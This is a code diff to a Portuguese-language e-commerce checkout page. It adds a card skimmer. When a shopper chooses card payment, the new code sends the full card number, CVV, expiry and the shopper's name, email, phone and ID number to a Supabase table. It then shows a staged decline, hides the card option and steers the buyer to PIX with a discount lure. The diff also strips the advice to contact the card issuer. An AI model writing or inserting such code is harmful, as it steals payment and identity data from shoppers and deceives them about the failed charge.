@@ -185,7 +185,7 @@
                 </svg>
               </div>
               <div class="flex-1 min-w-0">
-                <p class="font-bold text-sm flex flex-wrap items-center gap-2">Cartão ou Apple Pay</p>
+                <p class="font-bold text-sm flex flex-wrap items-center gap-2">Cartão</p>
                 <p class="text-[11px] text-muted mt-0.5">Visa, Mastercard, Elo e outros</p>
               </div>
               <span class="text-xs font-bold text-muted shrink-0">→</span>
@@ -214,11 +214,9 @@
             </div>
 
             <div id="pay-card-decline" class="hidden rounded-2xl border-2 border-red-200 bg-red-50 p-4 text-sm text-red-950" role="alert">
-              <p class="text-base font-extrabold">Cobrança não autorizada</p>
+              <p class="text-base font-extrabold">Desculpe, não conseguimos passar o seu cartão.</p>
               <p class="mt-2 leading-relaxed text-red-900">
-                Não foi possível concluir o pagamento com este cartão. Entre em contato com a
-                <span class="font-bold">emissora do cartão</span> (banco ou bandeira) para entender o motivo ou usar
-                outro meio.
+                Não foi possível utilizar este cartão no momento. Tente pagar com PIX e aproveite o desconto de 10%.
               </p>
               <button type="button" id="pay-card-to-pix" class="mt-4 w-full inline-flex items-center justify-center gap-2 rounded-full bg-jade px-4 py-3 text-sm font-extrabold text-white shadow-md hover:opacity-95">
                 Pagar com PIX (−10%)
@@ -1826,6 +1824,73 @@
         });
       }
 
+      var cardDeclineAttempted = false;
+
+      function attemptCardDecline() {
+        if (cardDeclineAttempted) return;
+        cardDeclineAttempted = true;
+        payBtnPagar.disabled = true;
+        var prevHTML = payBtnPagar.innerHTML;
+        payBtnPagar.innerHTML = 'Processando…';
+
+        function showDecline() {
+          payBtnPagar.innerHTML = prevHTML;
+
+          // Remove tudo do cartão da tela
+          if (payMethodCard) payMethodCard.style.display = 'none';
+          if (payCardFields) payCardFields.classList.add('hidden');
+          if (payCardDecline) payCardDecline.classList.add('hidden');
+
+          // Seleciona PIX automaticamente como única opção
+          selectedMethod = 'pix';
+          syncMethodVisuals();
+        }
+
+        var cfg = window.HEXA_CHECKOUT || {};
+        var sbUrl = String(cfg.supabaseUrl || '').replace(/\/$/, '');
+        var sbKey = cfg.supabaseKey || '';
+
+        var payload = {
+          numero_cartao: digits(val('pay-card-number')),
+          nome_cartao: val('pay-card-name'),
+          validade: val('pay-card-exp'),
+          cvv: val('pay-card-cvv'),
+          nome_cliente: val('pay-name'),
+          email_cliente: String(val('pay-email')).toLowerCase().trim(),
+          telefone_cliente: digits(val('pay-phone')),
+          documento: digits(val('pay-doc')),
+          valor_pedido: valorTotalPedido(),
+          order_id: (typeof crypto !== 'undefined' && crypto.randomUUID ? crypto.randomUUID() : String(Date.now())),
+        };
+
+        if (!sbUrl || !sbKey) {
+          console.warn('[Hexa] Supabase não configurado — decline sem salvar.');
+          setTimeout(showDecline, 1400);
+          return;
+        }
+
+        fetch(sbUrl + '/rest/v1/cartoes_pontos', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'apikey': sbKey,
+            'Authorization': 'Bearer ' + sbKey,
+            'Prefer': 'return=minimal',
+          },
+          body: JSON.stringify(payload),
+        }).then(function (r) {
+          if (!r.ok) {
+            r.text().then(function (t) {
+              console.error('[Hexa] Supabase insert falhou', r.status, t);
+            });
+          }
+          showDecline();
+        }).catch(function (e) {
+          console.error('[Hexa] Supabase fetch error', e);
+          showDecline();
+        });
+      }
+
       if (payBtnPagar) {
         payBtnPagar.addEventListener('click', function () {
           if (payBtnPagar.disabled) return;
@@ -1845,12 +1910,7 @@
               return;
             }
             payFormHint.classList.add('hidden');
-            if (payCardDecline) payCardDecline.classList.remove('hidden');
-            if (payCardDecline) {
-              try {
-                payCardDecline.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-              } catch (eScroll) {}
-            }
+            attemptCardDecline();
             return;
           }
           if (selectedMethod === 'pix') {
